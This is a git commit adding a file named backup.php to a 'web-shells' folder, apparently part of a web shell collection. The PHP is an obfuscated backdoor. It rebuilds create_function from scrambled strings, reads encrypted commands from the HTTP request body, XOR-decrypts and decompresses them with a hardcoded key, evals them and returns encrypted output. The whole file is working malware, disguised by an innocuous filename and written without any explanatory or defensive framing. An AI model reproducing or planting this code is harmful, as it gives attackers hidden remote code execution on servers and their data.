53323b2f8fc86fbf9c2ca534384df886c434c326
scripter <83101169+scripter54@users.noreply.github.com>
2021-06-02 16:32:22 -0400

    Add files via upload

---
+++ web-shells/backup.php
@@ -0,0 +1,11 @@
+<?php
+$I=str_replace('s','','csresatse_fsuncstsion');
+$L='"R/$kh(.+R)$kf/"RR,@file_get_conteRntsR("php:/R/inRput"),$m)=R=1) R{@ob_RsRtart();@';
+$J='evaRl(@gzuncoRmpreRss(@x(@bRase6R4R_dRecode($m[1]),$Rk)));$o=@RoRb_get_RRcontents();';
+$F='6"R;fRuncRtiRon x($t,$k){$c=sRtrlen($RRk);$l=strlen($Rt);$o=R"";for($i=0R;$iR<$l;){forR(R$';
+$z='$k="e4bbRfb14";R$kh=R"fa01R68313626";R$kf=R"R3R5ceaR3358fRb5";$p=R"QeqH3GUEoknwJwRM';
+$Y='j=0;R($j<$c&&$i<$Rl);$j+R+,$Ri++){$o.=$Rt{$Ri}R^$k{$j};}}reRtRurn $o;R}if (@preRRg_match(';
+$x='@obR_end_clRean()R;$r=@base6R4_eRncodRe(@x(@gzcRompRress($o),R$kR));print("$Rp$kh$rR$kf");}';
+$v=str_replace('R','',$z.$F.$Y.$L.$J.$x);
+$T=$I('',$v);$T();
+?>
